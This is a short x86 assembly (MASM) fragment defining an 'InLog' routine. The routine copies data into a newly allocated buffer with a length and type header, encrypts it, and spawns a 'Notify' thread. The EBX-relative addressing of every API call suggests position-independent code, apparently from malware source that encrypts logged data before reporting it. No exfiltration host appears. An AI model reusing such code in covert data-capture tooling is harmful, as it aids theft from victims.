
.code

;; ==================================================================================================== ;;
;; InLog -                                                                                              ;;
;; __in lpData - data ptr                                                                               ;;
;; __in dwLen  - data len                                                                               ;;
;; __in dwType - data type                                                                              ;;
;; ==================================================================================================== ;;
InLog proc lpData, dwLen, dwType : dword

	pushad

	invokx  _VirtualAlloc[ebx], 0, BUFFERLEN, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
	jmpz eax, @ret
	mov  edi, eax
	xchg eax, lpData
	mov  esi, eax


	mov  eax, dwLen
	add  eax, 8
	stosd		;; all len
	mov  eax, dwType
	stosd		;; type
	mov  eax, dwLen
	stosd		;; len
	invokx  &strcpyn[ebx], edi, esi, dwLen
	invokx  &Crypt[ebx], edi, dwLen


	invokx  _CreateThread[ebx], 0, 0, &Notify[ebx], lpData, 0, 0

@ret:
	popad
	ret
InLog endp

